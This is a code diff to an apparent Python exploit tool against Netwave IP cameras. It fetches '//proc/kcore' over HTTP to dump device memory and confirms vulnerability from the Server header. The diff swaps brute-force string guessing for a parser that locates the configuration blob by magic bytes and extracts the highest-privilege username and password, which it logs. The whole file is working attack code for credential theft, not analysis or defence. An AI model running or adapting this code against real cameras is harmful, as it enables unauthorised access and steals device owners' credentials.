@@ -3,17 +3,21 @@
 from __future__ import annotations
 
 import asyncio
-import ipaddress
-import itertools
 import logging
 import re
 from dataclasses import dataclass
-from datetime import datetime
-from typing import Any, List, Optional, Set, Tuple
+from re import Pattern
+from struct import Struct
+from typing import Any, Final, Optional
 
 import aiohttp
-import binary2strings
-from tenacity import retry, retry_if_not_exception_type
+
+CONFIG_MAGIC: Final[bytes] = b"\xbd\x9a\x0c\x44"
+DEVICE_ID_OFFSET: Final[int] = 0x0C
+DEVICE_ID: Final[Pattern[bytes]] = re.compile(rb"[0-9A-F]{12}\x00")
+USERS_OFFSET: Final[int] = 0x36
+USER: Final[Struct] = Struct("=13s13sB")
+CONFIG_SIZE: Final[int] = USERS_OFFSET + 8 * USER.size
 
 logger = logging.getLogger(__name__)
 
@@ -38,40 +42,6 @@ class DeviceCredentials:
 
     def __bool__(self) -> bool:
         return self.username is not None
-
-
-@dataclass
-class ExtractedString:
-    """A class for representing a string that was extracted from binary data."""
-
-    value: str
-    encoding: str
-    span: Tuple[int, int]
-    is_interesting: bool
-
-    def __str__(self) -> str:
-        return self.value
-
-    def __hash__(self) -> int:
-        return hash(self.value)
-
-    def __eq__(self, __value: object, /) -> bool:
-        if isinstance(__value, ExtractedString):
-            return self.value == __value.value
-
-        if isinstance(__value, str):
-            return self.value == __value
-
-        return NotImplemented
-
-    def __contains__(self, __value: object, /) -> bool:
-        if isinstance(__value, ExtractedString):
-            return __value.value in self.value
-
-        if isinstance(__value, str):
-            return __value in self.value
-
-        return NotImplemented
 
 
 class NetwaveDevice:
@@ -104,116 +74,105 @@ class NetwaveDevice:
         await self.close()
 
     @staticmethod
-    def _filter_strings(
-        device_id: str, strings: List[ExtractedString]
-    ) -> List[ExtractedString]:
+    def _field(data: bytes) -> Optional[str]:
         """
-        Remove unwanted strings such as IP addresses,
-        domain names, and email addresses.
+        Decode a NUL-terminated fixed-size ASCII field.
 
         Parameters
         ----------
-        device_id : str
-            The device ID of the Netwave IP camera.
-        strings : List[ExtractedString]
-            The strings to filter.
+        data : bytes
+            The raw field.
 
         Returns
         -------
-        List[ExtractedString]
-            The filtered strings.
+        Optional[str]
+            The field value, or None if it is empty or not printable ASCII.
         """
-        filtered_strings: Set[ExtractedString] = set()
-        domain_pattern = re.compile(r"[a-z0-9-]+\.[a-z0-9-]+\.[a-z]+")
-        email_pattern = re.compile(r"[a-z0-9_.+-]+@[a-z0-9-]+\.[a-z0-9-.]+")
+        value = data.split(b"\x00", 1)[0]
 
-        for string in itertools.dropwhile(lambda string: string != device_id, strings):
-            if (
-                string == device_id
-                or string.encoding == "WIDE_STRING"
-                or any(char in string for char in (" ", ":"))
-                or email_pattern.fullmatch(string.value) is not None
-                or domain_pattern.fullmatch(string.value) is not None
-            ):
-                continue
+        if not value or not value.isascii() or not value.decode().isprintable():
+            return None
 
-            try:
-                string.value.encode("ascii")
-            except UnicodeEncodeError:
-                continue
+        return value.decode()
 
-            try:
-                ipaddress.ip_address(string.value)
-            except ValueError:
-                filtered_strings.add(string)
-
-        return list(filtered_strings)
-
-    def _get_possible_credentials(
-        self, device_id: str, memory: bytes
-    ) -> List[DeviceCredentials]:
+    def _parse_config(self, config: bytes) -> Optional[DeviceCredentials]:
         """
-        Get the possible credentials of the Netwave IP camera.
+        Read the most privileged account out of a configuration blob.
 
         Parameters
         ----------
-        device_id : str
-            The device ID of the Netwave IP camera.
-        memory : bytes
-            The memory data of the Netwave IP camera.
+        config : bytes
+            The configuration blob, starting at its magic.
 
         Returns
         -------
-        List[DeviceCredentials]
-            A list of possible credentials for the Netwave IP camera.
+        Optional[DeviceCredentials]
+            The account with the highest privilege, or None if the table is empty.
         """
-        strings = [
-            ExtractedString(*string)
-            for string in binary2strings.extract_all_strings(
-                memory, only_interesting=True
-            )
-        ]
+        credentials: Optional[DeviceCredentials] = None
+        highest = -1
 
-        filtered_strings = self._filter_strings(device_id, strings)
+        for raw_username, raw_password, privilege in USER.iter_unpack(
+            config[USERS_OFFSET:CONFIG_SIZE]
+        ):
+            if privilege <= highest:
+                continue
 
-        if not filtered_strings:
-            return []
+            username = self._field(raw_username)
 
-        possible_credentials = list(itertools.permutations(filtered_strings, 2))
+            if username is None:
+                continue
 
-        possible_credentials.sort(
-            key=lambda credentials: "admin" in credentials[0], reverse=True
-        )
-
-        credentials = [
-            DeviceCredentials(
-                self._host, self._port, credentials[0].value, credentials[1].value
-            )
-            for credentials in possible_credentials
-        ]
-
-        credentials.extend(
-            [
-                DeviceCredentials(self._host, self._port, credentials[0].value)
-                for credentials in possible_credentials
-            ]
-        )
+            highest = privilege
+            password = self._field(raw_password)
+            credentials = DeviceCredentials(self._host, self._port, username, password)
 
         return credentials
 
-    async def _dump_memory(self, device_id: str) -> List[DeviceCredentials]:
+    def _scan(self, window: bytes) -> Optional[DeviceCredentials]:
         """
-        Dump the memory of the Netwave IP camera and retrieve possible credentials.
+        Find the device's configuration blob in a slice of its memory.
 
         Parameters
         ----------
-        device_id : str
-            The device ID of the Netwave IP camera.
+        window : bytes
+            The memory to search.
 
         Returns
         -------
-        List[DeviceCredentials]
-            A list of possible credentials for the Netwave IP camera.
+        Optional[DeviceCredentials]
+            The most privileged account of the first valid blob, or None.
+        """
+        for match in re.finditer(re.escape(CONFIG_MAGIC), window):
+            config = window[match.start() : match.start() + CONFIG_SIZE]
+
+            if len(config) != CONFIG_SIZE:
+                continue
+
+            device_id = DEVICE_ID.match(config, DEVICE_ID_OFFSET)
+
+            if device_id is None:
+                continue
+
+            credentials = self._parse_config(config)
+
+            if credentials is None:
+                continue
+
+            logger.info("[%s] Device ID: %s", self, device_id.group()[:-1].decode())
+            return credentials
+
+        return None
+
+    async def _dump_memory(self) -> Optional[DeviceCredentials]:
+        """
+        Dump the memory of the Netwave IP camera and retrieve its credentials.
+
+        Returns
+        -------
+        Optional[DeviceCredentials]
+            The credentials of the Netwave IP camera, or None if the
+            configuration blob was not found in the dump.
         """
         async with self._session.get(
             f"http://{self}//proc/kcore", timeout=aiohttp.ClientTimeout(0)
@@ -223,99 +182,22 @@ class NetwaveDevice:
                 or response.headers.get("Server") != "Netwave IP Camera"
             ):
                 logger.error("[%s] Device is not vulnerable", self)
-                return []
+                return None
 
             logger.info("[%s] Dumping memory...", self)
+            window = b""
 
             async for chunk in response.content.iter_any():
-                possible_credentials = self._get_possible_credentials(device_id, chunk)
+                window = window[-CONFIG_SIZE:] + chunk
+                credentials = self._scan(window)
 
-                if not possible_credentials:
+                if credentials is None:
                     continue
 
-                return possible_credentials
+                return credentials
 
-            logger.error("[%s] Could not find device ID in memory dump", self)
-            return []
-
-    async def _get_valid_credentials(
-        self, possible_credentials: List[DeviceCredentials]
-    ) -> Optional[DeviceCredentials]:
-        """
-        Get the valid credentials from a list of possible credentials.
-
-        Parameters
-        ----------
-        credentials : List[DeviceCredentials]
-            The list of possible credentials for the Netwave IP camera.
-
-        Returns
-        -------
-        Optional[DeviceCredentials]
-            The valid credentials for the Netwave IP camera.
-            Returns None if no valid credentials were found.
-        """
-        for credentials in possible_credentials:
-            if not await self._check_credentials(credentials):
-                continue
-
-            if credentials.password is None:
-                logger.info(
-                    "[%s] Found valid credentials: %s",
-                    self,
-                    credentials.username,
-                )
-            else:
-                logger.info(
-                    "[%s] Found valid credentials: %s:%s",
-                    self,
-                    credentials.username,
-                    credentials.password,
-                )
-
-            return credentials
-
-        logger.error("[%s] Could not find valid credentials in memory dump", self)
-        return None
-
-    @retry(retry=retry_if_not_exception_type((ValueError, asyncio.CancelledError)))
-    async def _check_credentials(self, credentials: DeviceCredentials) -> bool:
-        """
-        Check if the given credentials are valid.
-
-        Parameters
-        ----------
-        credentials : DeviceCredentials
-            The credentials to check.
-
-        Returns
-        -------
-        bool
-            Whether the credentials are valid.
-        """
-        if not credentials:
-            return False
-
-        if credentials.password is None:
-            auth = aiohttp.BasicAuth(credentials.username)
-        else:
-            auth = aiohttp.BasicAuth(credentials.username, credentials.password)
-
-        async with self._session.get(
-            f"http://{self}/check_user.cgi", auth=auth
-        ) as response:
-            if response.status != 200:
-                return False
-
-            try:
-                text = await response.text()
-            except UnicodeDecodeError:
-                return False
-
-        if re.match(r"var user='.+';\n?var pwd='.*';\n?var pri=\d;", text) is None:
-            return False
-
-        return True
+            logger.error("[%s] Could not find the config blob in memory dump", self)
+            return None
 
     @property
     def host(self) -> str:
@@ -331,49 +213,14 @@ class NetwaveDevice:
         """Close the session."""
         await self._session.close()
 
-    async def get_device_id(self) -> Optional[str]:
-        """
-        Get the device ID of the Netwave IP camera.
-
-        Returns
-        -------
-        Optional[str]
-            The device ID of the Netwave IP camera.
-            Returns None if the device ID could not be found.
-        """
-        async with self._session.get(f"http://{self}/get_status.cgi") as response:
-            if response.status != 200:
-                logger.error("[%s] Could not get device ID", self)
-                return None
-
-            try:
-                text = await response.text()
-            except UnicodeDecodeError:
-                logger.error("[%s] Could not decode status response", self)
-                return None
-
-        for line in text.splitlines():
-            device_id_match = re.match(r"var id='([0-9A-F]{12})';", line)
-
-            if device_id_match is None:
-                continue
-
-            return device_id_match.group(1)
-
-        logger.error("[%s] Could not find device ID in status response", self)
-        return None
-
     async def get_credentials(
-        self, *, device_id: Optional[str] = None, timeout: int = 300
+        self, *, timeout: int = 300
     ) -> Optional[DeviceCredentials]:
         """
         Get the credentials of the Netwave IP camera.
 
         Parameters
         ----------
-        device_id : str, optional
-            The device ID of the Netwave IP camera, by default None.
-            If None, the device ID will be retrieved.
         timeout : int, optional
             The timeout in seconds for retrieving the credentials from the memory dump,
             by default 300.
@@ -385,44 +232,22 @@ class NetwaveDevice:
             Returns None if the credentials could not be found.
         """
         try:
-            device_id = device_id or await self.get_device_id()
-        except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError):
-            logger.error("[%s] Could not get device ID", self)
-            return None
-
-        if device_id is None:
-            return None
-
-        logger.info("[%s] Device ID: %s", self, device_id)
-        start = datetime.now()
-
-        try:
-            possible_credentials = await asyncio.wait_for(
-                self._dump_memory(device_id), timeout=timeout
-            )
+            credentials = await asyncio.wait_for(self._dump_memory(), timeout=timeout)
         except (ConnectionError, asyncio.TimeoutError, aiohttp.ClientError):
             logger.error("[%s] Could not dump memory", self)
             return None
 
-        if not possible_credentials:
-            return None
-
-        remaining_time = timeout - (datetime.now() - start).total_seconds()
-
-        logger.info(
-            "[%s] Found %s possible credentials", self, f"{len(possible_credentials):,}"
-        )
-
-        try:
-            credentials = await asyncio.wait_for(
-                self._get_valid_credentials(possible_credentials),
-                timeout=remaining_time,
-            )
-        except (asyncio.TimeoutError, asyncio.CancelledError):
-            logger.error("[%s] Could not get valid credentials", self)
-            return None
-
         if credentials is None:
             return None
+
+        if credentials.password is None:
+            logger.info("[%s] Found credentials: %s", self, credentials.username)
+        else:
+            logger.info(
+                "[%s] Found credentials: %s:%s",
+                self,
+                credentials.username,
+                credentials.password,
+            )
 
         return credentials
